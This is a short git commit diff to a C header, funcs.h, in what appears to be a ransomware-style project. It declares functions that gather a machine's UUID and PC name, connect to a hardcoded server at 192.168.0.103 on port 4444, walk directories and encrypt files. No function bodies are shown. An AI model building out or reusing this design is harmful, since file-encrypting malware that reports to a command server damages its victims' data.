8b75aea42653f847551c52d2be212a6920d1fd9d
KvN0X00 <65466003+Kanui-C@users.noreply.github.com>
2021-04-14 15:10:46 -0300

    Update funcs.h

--- libs/funcs.h
+++ libs/funcs.h
@@ -1,13 +1,18 @@
 #ifndef USAGE_H_INCLUDED
 #define USAGE_H_INCLUDED
 
+
 #define myhost "192.168.0.103"
 #define myport 4444
 
-void connectserver();
+void connectserver(char *uuid);
 
 void encryptfile(char *encryptfile);
 
 void WhatIsDir(char *name_dir);
+
+char *getuuid();
+
+char *getpcname();
 
 #endif
